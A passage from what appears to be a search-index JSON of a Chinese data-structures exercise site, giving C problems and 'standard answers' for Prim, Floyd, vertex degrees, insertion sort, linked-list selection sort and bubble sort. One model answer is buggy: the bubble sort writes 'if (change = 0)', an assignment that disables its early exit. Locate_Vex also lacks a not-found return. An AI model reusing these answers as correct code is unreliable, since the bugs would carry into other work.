    p = p-&gt;nextarc;\n            if(p-&gt;adjvex == x){\n                pre-&gt;nextarc = p-&gt;nextarc;\n                free(p);\n                break;\n            }\n            pre = p;\n        }\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E5%9B%BE/#_15","title":"\u666e\u91cc\u59c6\u7b97\u6cd5","text":"<p>\u6709\u4e00\u4e2a\u5e26\u6743\u65e0\u5411\u56fe\uff0c\u56fe\u4e2d\u7684\u6bcf\u6761\u8fb9\u90fd\u6709\u4e00\u4e2a\u6743\u503c\u3002\u8bf7\u7f16\u5199\u7a0b\u5e8f\uff0c\u5b8c\u6210<code>prim</code>\u51fd\u6570\uff0c\u5b9e\u73b0\u5229\u7528\u666e\u91cc\u59c6\u7b97\u6cd5\u6784\u9020\u8be5\u56fe\u7684\u6700\u5c0f\u751f\u6210\u6811\uff0c\u5e76\u8ba1\u7b97\u6700\u5c0f\u751f\u6210\u6811\u7684\u6743\u503c\u4e4b\u548c\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E5%9B%BE/#_16","title":"\u793a\u4f8b\u8f93\u51fa","text":"Text Only<pre><code>15\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E5%9B%BE/#_17","title":"\u9898\u76ee","text":"C<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n\n#define INF  0x7fffffff\n#define MAX 100  \n\n//\u8bf7\u5b8c\u6210\u5229\u7528\u666e\u91cc\u59c6\u7b97\u6cd5\u6784\u9020\u6700\u5c0f\u751f\u6210\u6811\uff0c\u51fd\u6570\u8fd4\u56de\u6700\u5c0f\u751f\u6210\u6811\u7684\u6743\u503c\u7684\u548c \n//\u53c2\u6570\uff1an\uff0c\u8868\u793a\u56fe\u7684\u9876\u70b9\u6570\n//graph\uff0c\u8868\u793a\u56fe\u7684\u90bb\u63a5\u77e9\u9635 \nint prim(int graph[][MAX], int n)  \n{   \n    //\u8bf7\u5728\u6b64\u5904\u5b8c\u6210\u4ee3\u7801\n\n\n\n}\n\nint main()  \n{  \n    int edge[MAX][MAX]={{INF,INF,INF,INF,INF,INF,INF},\\\n    {INF,INF,6,1,5,INF,INF},\\\n    {INF,6,INF,5,INF,3,INF},\\\n    {INF,1,5,INF,5,6,4},\\\n    {INF,5,INF,5,INF,INF,2},\\\n    {INF,INF,INF,3,INF,6,6},\\\n    {INF,INF,INF,4,2,6,INF}};\n\n    printf(\"%d\",prim(edge, 6));  \n    return 0;  \n}  \n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E5%9B%BE/#_18","title":"\u6807\u51c6\u7b54\u6848","text":"C<pre><code>int prim(int graph[][MAX], int n)\n{\n    int lowcost[MAX];  // \u8bb0\u5f55\u5f53\u524d\u751f\u6210\u6811\u5230\u5404\u9876\u70b9\u7684\u6700\u5c0f\u6743\u503c\n    int mst[MAX];  // \u8bb0\u5f55\u6700\u5c0f\u751f\u6210\u6811\u7684\u9876\u70b9\n    int i, j, min, minid, sum = 0;  // \u5faa\u73af\u53d8\u91cf\u548c\u7d2f\u52a0\u603b\u6743\u503c\u7684\u53d8\u91cf\n\n    // \u521d\u59cb\u5316lowcost\u548cmst\u6570\u7ec4\n    for (i = 2; i &lt;= n; i++) { // \u4e0b\u6807\u4ece1\u5f00\u59cb\n        lowcost[i] = graph[1][i];\n        mst[i] = 1;\n    }\n\n    mst[1] = 0;  // \u5c06\u8d77\u59cb\u9876\u70b9\u52a0\u5165\u6700\u5c0f\u751f\u6210\u6811\n    for (i = 2; i &lt;= n; i++) { // i\u7528\u4e8e\u63a7\u5236\u5916\u5c42\n        min = INF;\n        minid = 0;\n\n        // \u5bfb\u627elowcost\u4e2d\u6700\u5c0f\u6743\u503c\u7684\u9876\u70b9\n        for (j = 2; j &lt;= n; j++) { \n            // \u66f4\u65b0\u6700\u5c0f\u6743\u503c\u548c\u5bf9\u5e94\u9876\u70b9\n            if (lowcost[j] &lt; min &amp;&amp; lowcost[j] != 0) { // lowcost[j]&gt;0 \u8868\u793a\u9876\u70b9\u8fd8\u5728\u56fe\u4e2d\n                min = lowcost[j];\n                minid = j;\n            }\n        }\n\n        // \u5c06\u6700\u5c0f\u6743\u503c\u52a0\u5165\u603b\u6743\u503c\n        sum += min;\n        lowcost[minid] = 0;  // \u5c06\u5df2\u52a0\u5165\u6700\u5c0f\u751f\u6210\u6811\u7684\u9876\u70b9\u6743\u503c\u8bbe\u4e3a0\n\n        for (j = 2; j &lt;= n; j++) {\n            // \u66f4\u65b0\u751f\u6210\u6811\u5230\u5404\u9876\u70b9\u7684\u6700\u5c0f\u6743\u503c\u548c\u5bf9\u5e94\u9876\u70b9\n            if (graph[minid][j] &lt; lowcost[j]) {\n                lowcost[j] = graph[minid][j];\n                mst[j] = minid;\n            }\n        }\n    }\n\n    return sum;  // \u8fd4\u56de\u6700\u5c0f\u751f\u6210\u6811\u7684\u603b\u6743\u503c\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E5%9B%BE/#floyd","title":"\u6700\u77ed\u8def\u5f84\uff08Floyd\u7b97\u6cd5\uff09","text":"<p>\u6709\u4e00\u4e2a\u5e26\u6743\u6709\u5411\u56fe\uff0c\u56fe\u4e2d\u7684\u6bcf\u6761\u8fb9\u90fd\u6709\u4e00\u4e2a\u6743\u503c\u3002\u8bf7\u7f16\u5199\u7a0b\u5e8f\uff0c\u5b8c\u6210<code>Floyd</code>\u51fd\u6570\uff0c\u5b9e\u73b0\u5229\u7528\u5f17\u6d1b\u4f0a\u5fb7\u7b97\u6cd5\u6c42\u89e3\u8be5\u56fe\u7684\u6700\u77ed\u8def\u5f84\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E5%9B%BE/#_19","title":"\u793a\u4f8b\u8f93\u51fa","text":"Text Only<pre><code>0 6 1 5 7 5 6 0 5 10 3 9 1 5 0 5 6 4 5 10 5 0 8 2 7 3 6 8 0 6 5 9 4 2 6 0\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E5%9B%BE/#_20","title":"\u9898\u76ee","text":"C<pre><code>//\u5229\u7528\u5f17\u6d1b\u4f0a\u5fb7\u7b97\u6cd5\u6c42\u6700\u77ed\u8def\u5f84 \n#include &lt;stdio.h&gt;\n#define INF  1000\n\n//\u8bf7\u5b8c\u6210\u8be5\u51fd\u6570\uff0c\u5b9e\u73b0 \u5229\u7528\u5f17\u6d1b\u4f0a\u5fb7\u7b97\u6cd5\u6c42\u6700\u77ed\u8def\u5f84\n//\u53c2\u6570\uff1an\uff0c\u4ee3\u8868\u56fe\u7684\u9876\u70b9\u4e2a\u6570\n//      r,\u8868\u793a\u9876\u70b9\u8def\u5f84\u7684\u503c\uff0c\u5982\uff0cr[2][3],\u8868\u793a\u4ece\u9876\u70b92\u5230\u9876\u70b93\u7684\u6700\u5c0f\u8def\u5f84\u7684\u503c \nvoid Floyd(int r[][7], int n)\n{\n    //\u8bf7\u5728\u6b64\u5904\u5b8c\u6210\u4ee3\u7801 \n\n\n\n}\n\nint main(){\n    int e[7][7]={{INF,INF,INF,INF,INF,INF,INF},\\\n    {INF,0,6,1,5,INF,INF},\\\n    {INF,6,0,5,INF,3,INF},\\\n    {INF,1,5,0,5,6,4},\\\n    {INF,5,INF,5,0,INF,2},\\\n    {INF,INF,3,6,INF,0,6},\\\n    {INF,INF,INF,4,2,6,0}};\n    int n = 6;\n    Floyd(e, n);\n\n    //\u8f93\u51fa\u6700\u7ec8\u7684\u7ed3\u679c\n    int i,j;\n    for(i=1;i&lt;=n;i++)\n    {\n        for(j=1;j&lt;=n;j++)\n        {\n            printf(\"%d \",e[i][j]);\n        }\n    }\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E5%9B%BE/#_21","title":"\u6807\u51c6\u7b54\u6848","text":"C<pre><code>void Floyd(int r[][7], int n) {\n    int k, i, j;\n    for (k = 1; k &lt;= n; k++) // k\u662f\u4e2d\u95f4\u70b9\n    {\n        for (i = 1; i &lt;= n; i++)\n        {\n            for (j = 1; j &lt;= n; j++)\n            {\n                if (r[i][j] &gt; r[i][k] + r[k][j]) {\n                    r[i][j] = r[i][k] + r[k][j];\n                }\n            }\n        }\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E5%9B%BE/#_22","title":"\u8ba1\u7b97\u65e0\u5411\u56fe\u4e2d\u5404\u4e2a\u9876\u70b9\u7684\u5ea6","text":"<p>\u8bf7\u8bbe\u8ba1\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5b9e\u73b0\u65e0\u5411\u56fe\u7684\u5ea6\u8ba1\u7b97\u529f\u80fd\u3002\u7ed9\u5b9a\u4e00\u4e2a\u65e0\u5411\u56fe\uff0c\u4f7f\u7528\u90bb\u63a5\u8868\u8868\u793a\uff0c\u8ba1\u7b97\u56fe\u4e2d\u6bcf\u4e2a\u9876\u70b9\u7684\u5ea6\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E5%9B%BE/#_23","title":"\u793a\u4f8b","text":"<p>\u8981\u6c42</p> Text Only<pre><code>1\u3001\u9876\u70b9\u7f16\u53f7\u4ece0\u5f00\u59cb\n2\u3001\u8f93\u5165\u8f93\u51fa\u89c4\u5219\u53c2\u8003\u4e0b\u9762\u7684\u4f8b\u5b50\n</code></pre> <p>\u8f93\u5165</p> Text Only<pre><code>\u8bf7\u8f93\u5165\u56fe\u7684\u9876\u70b9\u4e2a\u6570\u548c\u8fb9\u7684\u4e2a\u6570\uff1a3,2\n\n\u8bf7\u8f93\u5165\u7b2c1\u6761\u8fb9\uff08\u9876\u70b9\u4ece0\u5f00\u59cb\uff09\uff1a0-1\n\u8bf7\u8f93\u5165\u7b2c2\u6761\u8fb9\uff08\u9876\u70b9\u4ece0\u5f00\u59cb\uff09\uff1a1-2\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>\u8be5\u65e0\u5411\u56fe\u4e2d\u9876\u70b90\u5230\u9876\u70b92\u7684\u5ea6\u4f9d\u6b21\u4e3a\uff1a1 2 1\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E5%9B%BE/#_24","title":"\u9898\u76ee","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#define Max_Vertex_Num 100\n\n// \u5b9a\u4e49\u7ed3\u6784\u4f53\ntypedef struct ArcNode {\n    int adjvex;\n    struct ArcNode *nextarc; // \u4e0b\u4e00\u4e2a\u8282\u70b9\n} ArcNode;\n\ntypedef struct VNode {\n    int vertex;            // \u5934\u7ed3\u70b9\u6570\u636e\n    ArcNode *firstarc;     // \u6307\u5411\u8be5\u9876\u70b9\u7b2c\u4e00\u6761\u8fb9\u7684\u6307\u9488\n} VNode, Adjlist[Max_Vertex_Num]; // \u5934\u7ed3\u70b9\u6570\u7ec4\n\ntypedef struct {\n    Adjlist adjlist; // \u90bb\u63a5\u8868\u6570\u7ec4\uff0c\u6bcf\u4e2a\u5143\u7d20\u5b58\u50a8\u4e0e\u8be5\u9876\u70b9\u5173\u8054\u7684\u70b9\n    int vexnum, arcnum; // \u9876\u70b9\u6570\u548c\u8fb9\u6570\n} ALGraph; // \u90bb\u63a5\u8868\n\nint Locate_Vex(ALGraph *G, int v) {\n    // \u786e\u5b9a\u8f93\u5165\u8fb9\u7684\u4f4d\u7f6e\uff08\u7531\u9876\u70b9\u786e\u5b9a\uff09\n\n}\n\nvoid Create_ALGraph(ALGraph *G) {\n    // \u521b\u5efa\u65e0\u5411\u56fe\n\n}\n\nvoid Account_Degree(ALGraph *G) {\n\n}\n\nint main() {\n    ALGraph G;\n    Create_ALGraph(&amp;G); // \u521b\u5efa\u65e0\u5411\u56fe\n    Account_Degree(&amp;G); // \u8ba1\u7b97\u5ea6\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E5%9B%BE/#_25","title":"\u6807\u51c6\u7b54\u6848","text":"<p>\u8fd8\u7b97\u6761\u7406\u6e05\u6670</p> C<pre><code>int Locate_Vex(ALGraph* G, int v) {\n    // \u786e\u5b9a\u8f93\u5165\u8fb9\u7684\u4f4d\u7f6e\uff08\u7531\u9876\u70b9\u786e\u5b9a\uff09\n    for (int i = 0; i &lt; G-&gt;vexnum; i++) {\n        if (G-&gt;adjlist[i].vertex == v) {\n            return i;\n        }\n    }\n}\n\nvoid Create_ALGraph(ALGraph *G) {\n    // \u521b\u5efa\u65e0\u5411\u56fe\n    ArcNode *p;\n    int v1, v2, x; // \u8f93\u5165\u8fb9\u7684\u4e24\u4e2a\u9876\u70b9\n\n    printf(\"\u8bf7\u8f93\u5165\u56fe\u7684\u9876\u70b9\u4e2a\u6570\u548c\u8fb9\u7684\u4e2a\u6570\uff1a\");\n    scanf(\"%d,%d\", &amp;G-&gt;vexnum, &amp;G-&gt;arcnum); // \u7528\u9017\u53f7\u5206\u9694\n\n    for (x = 0; x &lt; G-&gt;vexnum; x++) {\n        G-&gt;adjlist[x].vertex = x;\n        G-&gt;adjlist[x].firstarc = NULL;\n    } // \u521d\u59cb\u5316\n\n    x = 0;\n    printf(\"\\n\");\n\n    while (x &lt; G-&gt;arcnum) {\n        printf(\"\u8bf7\u8f93\u5165\u7b2c%d\u6761\u8fb9\uff08\u9876\u70b9\u4ece0\u5f00\u59cb\uff09\uff1a\", x + 1);\n        scanf(\"%d-%d\", &amp;v1, &amp;v2);\n        x++;\n\n        int i = Locate_Vex(G, v1);\n        int j = Locate_Vex(G, v2);\n\n        p = (ArcNode *)malloc(sizeof(ArcNode)); // \u6dfb\u52a0\u4e00\u4e2a\u6570\u636e\u4e3aj\u7684\u8fb9\u7ed3\u70b9\u5230i\u7684\u8868\u5934\n        p-&gt;adjvex = j;\n        p-&gt;nextarc = G-&gt;adjlist[i].firstarc; // \u53ef\u4ee5\u7406\u89e3\u4e3a\u5934\u63d2\n        G-&gt;adjlist[i].firstarc = p;\n\n        p = (ArcNode *)malloc(sizeof(ArcNode)); // \u6dfb\u52a0\u4e00\u4e2a\u6570\u636e\u4e3ai\u7684\u8fb9\u7ed3\u70b9\u5230j\u7684\u8868\u5934\n        p-&gt;adjvex = i;\n        p-&gt;nextarc = G-&gt;adjlist[j].firstarc;\n        G-&gt;adjlist[j].firstarc = p;\n    }\n}\n\nvoid Account_Degree(ALGraph *G) {\n    ArcNode *p;\n    int i;\n    printf(\"\\n\u8be5\u65e0\u5411\u56fe\u4e2d\u9876\u70b90\u5230\u9876\u70b9%d\u7684\u5ea6\u4f9d\u6b21\u4e3a\uff1a\", G-&gt;vexnum - 1);\n\n    for (i = 0; i &lt; G-&gt;vexnum; i++) {\n        int degree = 0;\n        p = G-&gt;adjlist[i].firstarc;\n        while (p != NULL) {\n            degree++;\n            p = p-&gt;nextarc;\n        }\n        printf(\"%d \", degree);\n    }\n}\n</code></pre> <p>\u5bf9<code>Create_ALGraph</code>\u51fd\u6570\u4e2d\u6700\u540e\u4e00\u90e8\u5206\u7684\u8bb2\u89e3\uff08\u4ee5\u7b2c\u4e00\u5927\u5757\u4e3a\u4f8b\uff09</p> <ol> <li>\u4f7f\u7528<code>malloc</code>\u51fd\u6570\u5206\u914d\u4e86\u5185\u5b58\u4ee5\u5b58\u50a8\u4e00\u4e2a\u65b0\u7684<code>ArcNode</code>\u7c7b\u578b\u7684\u8fb9\u7ed3\u70b9\u3002</li> <li>\u5c06\u8fd9\u4e2a\u8fb9\u7ed3\u70b9\u7684<code>adjvex</code>\u5c5e\u6027\u8bbe\u7f6e\u4e3a\u76ee\u6807\u9876\u70b9<code>j</code>\u7684\u503c\uff0c\u8868\u793a\u8fd9\u6761\u8fb9\u6307\u5411\u9876\u70b9<code>j</code>\u3002</li> <li>\u5c06\u8fd9\u4e2a\u8fb9\u7ed3\u70b9\u7684<code>nextarc</code>\u5c5e\u6027\u6307\u5411\u9876\u70b9<code>i</code>\u539f\u672c\u7684\u7b2c\u4e00\u6761\u8fb9\uff0c\u4ee5\u4fdd\u8bc1\u65b0\u6dfb\u52a0\u7684\u8fb9\u5728\u94fe\u8868\u4e2d\u6392\u5728\u539f\u6709\u7684\u8fb9\u4e4b\u524d\u3002</li> <li>\u5c06\u9876\u70b9<code>i</code>\u7684<code>firstarc</code>\u6307\u9488\u6307\u5411\u65b0\u6dfb\u52a0\u7684\u8fb9\u7ed3\u70b9\uff0c\u5b8c\u6210\u4e86\u5728\u90bb\u63a5\u8868\u4e2d\u6dfb\u52a0\u8fb9\u7684\u8fc7\u7a0b\u3002</li> </ol>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/","title":"Alpha \u6392\u5e8f","text":""},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_1","title":"\u76f4\u63a5\u63d2\u5165\u6392\u5e8f\u7b97\u6cd5\u7684\u5b9e\u73b0","text":"<p>\u8bf7\u7f16\u5199\u7a0b\u5e8f\uff0c\u5b8c\u6210<code>InsertSort</code>\u51fd\u6570\uff0c\u7ed9\u5b9a\u4e00\u4e2a\u6574\u6570\u6570\u7ec4 a \u548c\u6570\u7ec4\u7684\u957f\u5ea6 length\uff0c\u5b9e\u73b0\u76f4\u63a5\u63d2\u5165\u6392\u5e8f\u7b97\u6cd5\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_2","title":"\u793a\u4f8b\u8f93\u51fa","text":"Text Only<pre><code>13 27 38 49 51 65 76 97\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_3","title":"\u9898\u76ee","text":"C<pre><code>//\u76f4\u63a5\u63d2\u5165\u6392\u5e8f \n#include&lt;stdio.h&gt;\n\n//\u8bf7\u5b8c\u6210InsertSort\u51fd\u6570\uff0c\u5b9e\u73b0\"\u76f4\u63a5\u63d2\u5165\u6392\u5e8f\"\u7684\u529f\u80fd \n//\u53c2\u6570\uff1aL\uff0c\u6392\u5e8f\u7684\u6570\u5217\n//length, \u6392\u5e8f\u7684\u6570\u5217\u7684\u957f\u5ea6\nvoid InsertSort(int *L, int length)\n{\n    //\u8bf7\u5728\u6b64\u5904\u586b\u5199\u4ee3\u7801 \n\n\n}\n\nint main(){\n    int a[]={49,38,65,97,76,13,27,51};\n    int n = sizeof(a) / sizeof(a[0]);\n    InsertSort(a,n);\n    int i; \n    for(i = 0; i &lt; n; i++)\n        printf(\"%d \",a[i]);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_4","title":"\u6807\u51c6\u7b54\u6848","text":"C<pre><code>void InsertSort(int* L, int length)\n{\n    int i, j;\n    for (i = 1; i &lt; length; i++) {\n        if (L[i] &lt; L[i - 1]) {\n            int temp = L[i];\n            for (j = i - 1; j &gt;= 0 &amp;&amp; L[j] &gt; temp; j--) {\n                L[j + 1] = L[j];\n            }\n            L[j + 1] = temp;\n        }\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_5","title":"\u5355\u94fe\u8868\u7684\u7b80\u5355\u9009\u62e9\u6392\u5e8f\uff08\u5f85\u89e3\u51b3\uff09","text":"<p>\u8bbe\u8ba1\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5b9e\u73b0\u5bf9\u5355\u94fe\u8868\u7684\u7b80\u5355\u9009\u62e9\u6392\u5e8f\u3002\u7528\u6237\u8f93\u5165\u94fe\u8868\u7684\u5143\u7d20\u4e2a\u6570\u548c\u6570\u636e\uff0c\u7a0b\u5e8f\u521b\u5efa\u4e00\u4e2a\u5355\u94fe\u8868\uff0c\u5e76\u5bf9\u5176\u8fdb\u884c\u5347\u5e8f\u6392\u5e8f\u3002\u6700\u540e\uff0c\u7a0b\u5e8f\u8f93\u51fa\u6392\u5e8f\u540e\u7684\u94fe\u8868\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_6","title":"\u793a\u4f8b","text":"<p>\u8f93\u5165</p> Text Only<pre><code>\u94fe\u8868\u7684\u5143\u7d20\u4e2a\u6570\u4e3a\uff1a4\n\n\u8bf7\u8f93\u5165\u94fe\u8868\u7684\u6570\u636e\uff1a\n\u5355\u94fe\u8868\u4e2d\u7b2c 1\u4e2a\u5143\u7d20\u662f\uff1a3\n\u5355\u94fe\u8868\u4e2d\u7b2c 2\u4e2a\u5143\u7d20\u662f\uff1a-1\n\u5355\u94fe\u8868\u4e2d\u7b2c 3\u4e2a\u5143\u7d20\u662f\uff1a1\n\u5355\u94fe\u8868\u4e2d\u7b2c 4\u4e2a\u5143\u7d20\u662f\uff1a2\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>\u6392\u5e8f\u540e\u7684\u94fe\u8868\u4e3a\uff1a-1 1 2 3\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_7","title":"\u9898\u76ee","text":"C<pre><code>    #include &lt;stdio.h&gt;\n    #include &lt;stdlib.h&gt;\n\n    typedef struct LNode {\n        int data;\n        struct LNode *next;\n    } LNode, *LinkList;\n\n    void Create_LinkList(LinkList *L, int n) {\n        //\u521b\u5efa\u94fe\u8868\n        //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n    }\n\n    void print_LinkList(LinkList L) {\n        //\u8f93\u51fa\u94fe\u8868\n        //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n    }\n\n    void SelectSort(LinkList *L) {\n        //\u7b80\u5355\u9009\u62e9\u6392\u5e8f\n        //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n    }\n\n    int main() {\n        //\u521b\u5efa\u94fe\u8868\n        LinkList L;\n\n        //\u8f93\u5165\u6570\u636e\n        int n;\n        printf(\"\u94fe\u8868\u7684\u5143\u7d20\u4e2a\u6570\u4e3a\uff1a\");\n        scanf(\"%d\", &amp;n);\n        printf(\"\\n\u8bf7\u8f93\u5165\u94fe\u8868\u7684\u6570\u636e\uff1a\\n\");\n        Create_LinkList(&amp;L, n);\n\n        SelectSort(&amp;L);\n        printf(\"\\n\u6392\u5e8f\u540e\u7684\u94fe\u8868\u4e3a\uff1a\");\n        print_LinkList(L);\n\n        // \u91ca\u653e\u94fe\u8868\u5185\u5b58\n        LinkList p = L, temp;\n        while (p) {\n            temp = p-&gt;next;\n            free(p);\n            p = temp;\n        }\n\n        return 0;\n    }\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_8","title":"\u6807\u51c6\u7b54\u6848","text":"C<pre><code>void Create_LinkList(LinkList* L, int n) {\n    *L = (LinkList)malloc(sizeof(LNode)); //\u521b\u5efa\u5934\u7ed3\u70b9\n    (*L)-&gt;next = NULL;\n\n    LinkList rear; //\u5c3e\u6307\u9488\n    rear = *L;     //\u6307\u5411\u5934\u7ed3\u70b9\n\n    for (int i = 0; i &lt; n; i++) {\n        LinkList temp = (LinkList)malloc(sizeof(LNode)); //\u7ed9\u65b0\u7ed3\u70b9\u521b\u5efa\u7a7a\u95f4\n        temp-&gt;next = NULL;\n        printf(\"\u5355\u94fe\u8868\u4e2d\u7b2c%2d\u4e2a\u5143\u7d20\u662f\uff1a\", i + 1); //\u4e0b\u6807\u662f\u4ece0\u5f00\u59cb\u7684\uff0c\u5f97\u52a01\n        scanf(\"%d\", &amp;temp-&gt;data);\n        rear-&gt;next = temp; //\u65b0\u7ed3\u70b9\u63d2\u5165\u94fe\u8868\u5c3e\u90e8\n        rear = temp;       //rear\u6307\u5411\u65b0\u7684\u5c3e\u8282\u70b9\n    }\n}\n\nvoid print_LinkList(LinkList L) {\n    LinkList p = L;\n    while (p-&gt;next != NULL) {\n        p = p-&gt;next; //\u8df3\u8fc7\u5934\u7ed3\u70b9\u8f93\u51fa\u4e0b\u4e00\u4e2a\u7ed3\u70b9\u4e2d\u5b58\u50a8\u7684\u6570\u503c\n        printf(\"%d \", p-&gt;data);\n    }\n}\n\nvoid SelectSort(LinkList* L) {\n    //\u7b80\u5355\u9009\u62e9\u6392\u5e8f\n    LinkList left, right, p = (*L)-&gt;next;\n    int temp;\n\n    while (p) {\n        right = p-&gt;next;\n        left = p;\n\n        while (right) {\n            if (right-&gt;data &lt; left-&gt;data) {\n                left = right;\n            } \n            right = right-&gt;next;\n        }\n\n        if (left != p) {\n            temp = left-&gt;data;\n            left-&gt;data = p-&gt;data;\n            p-&gt;data = temp;\n        }\n        p = p-&gt;next;\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_9","title":"\u5192\u6ce1\u6392\u5e8f\u7684\u5b9e\u73b0","text":"<p>\u8bf7\u7f16\u5199\u7a0b\u5e8f\uff0c\u5b8c\u6210<code>BubbleSort</code>\u51fd\u6570\uff0c\u7ed9\u5b9a\u4e00\u4e2a\u6574\u6570\u6570\u7ec4 a \u548c\u6570\u7ec4\u7684\u957f\u5ea6 n\uff0c\u5b9e\u73b0\u5192\u6ce1\u6392\u5e8f\u7b97\u6cd5\uff0c\u8f93\u51fa\u6bcf\u8d9f\u6392\u5e8f\u540e\u7684\u6570\u7ec4\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_10","title":"\u793a\u4f8b\u8f93\u51fa","text":"Text Only<pre><code>38 49 65 76 13 27 51 97 \n38 49 65 13 27 51 76 97 \n38 49 13 27 51 65 76 97 \n38 13 27 49 51 65 76 97 \n13 27 38 49 51 65 76 97\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_11","title":"\u9898\u76ee","text":"C<pre><code>//\u5192\u6ce1\u6392\u5e8f \n#include&lt;stdio.h&gt;\n\n//\u8bf7\u5b8c\u6210BubbleSort\u51fd\u6570\uff0c\u5b9e\u73b0\"\u5192\u6ce1\u6392\u5e8f\"\u7684\u529f\u80fd \n//\u53c2\u6570\uff1aa\uff0c\u6392\u5e8f\u7684\u6570\u5217\n//\u53c2\u6570\uff1an, \u6392\u5e8f\u7684\u6570\u5217\u7684\u957f\u5ea6\nvoid BubbleSort(int *a, int n){\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nint main(){\n    int a[] = {49, 38, 65, 97, 76, 13, 27, 51};\n    int n = sizeof(a) / sizeof(a[0]);\n    BubbleSort(a, n);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_12","title":"\u6807\u51c6\u7b54\u6848","text":"C<pre><code>void BubbleSort(int* a, int n) {\n    int i, j;\n    int change;\n\n    for (i = 0; i &lt; n - 1; i++) {\n        change = 0;\n        for (j = 0; j &lt; n - i - 1; j++) {\n            if (a[j] &gt; a[j + 1]) {\n                int temp = a[j];\n                a[j] = a[j + 1];\n                a[j + 1] = temp;\n                change = 1;\n            }\n        }\n\n        if (change = 0) {\n            break;\n        }\n\n        for (int k = 0; k &lt; n; k++) {\n            printf(\"%d \", a[k]);\n        }\n        printf(\"\\n\");\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_13","title":"\u5b9e\u73b0\u5192\u6ce1\u6392\u5e8f\u7b97\u6cd5","text":"<p>\u7f16\u5199\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5b9e\u73b0\u5192\u6ce1\u6392\u5e8f\u7b97\u6cd5\uff0c\u5bf9\u7ed9\u5b9a\u7684\u6574\u6570\u6570\u7ec4\u8fdb\u884c\u5347\u5e8f\u6392\u5e8f\u3002\u5b8c\u5584\u51fd\u6570 Bubble_Sort\uff0c\u8be5\u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u6574\u6570\u6570\u7ec4\u548c\u6570\u7ec4\u957f\u5ea6\u4f5c\u4e3a\u53c2\u6570\uff0c\u5e76\u5728\u539f\u5730\u5bf9\u6570\u7ec4\u8fdb\u884c\u6392\u5e8f\u3002\u6392\u5e8f\u5b8c\u6210\u540e\uff0c\u8f93\u51fa\u6392\u5e8f\u540e\u7684\u6570\u7ec4\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_14","title":"\u793a\u4f8b","text":"<p>\u8f93\u5165</p> Text Only<pre><code>\u5728\u4e3b\u51fd\u6570\u4e2d\u8bbe\u7f6estr[] = {3,1,7,8,10,6,5,9,12,0};\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>\u5192\u6ce1\u6392\u5e8f\u540e\u7684\u5e8f\u5217\u4e3a\uff1a0 1 3 5 6 7 8 9 10 12\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_15","title":"\u9898\u76ee","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nvoid Bubble_Sort(int *str,int n){\n     //\u5192\u6ce1\u6392\u5e8f\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nint main(){  \n    //\u6839\u636e\u9898\u610f\uff0c\u5b8c\u6210\u7a0b\u5e8f\n\n     int str[] = {2,5,6,3,7,8,0,9,12,1};  \n     Bubble_Sort(str, 10);\n     printf(\"\u5192\u6ce1\u6392\u5e8f\u540e\u7684\u5e8f\u5217\u4e3a\uff1a\"); \n     for (int i = 0; i &lt; 10; i++)\n          printf(\"%d \",str[i]);\n     return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_16","title":"\u6807\u51c6\u7b54\u6848","text":"C<pre><code>void Bubble_Sort(int* str, int n) {\n    int temp, i, 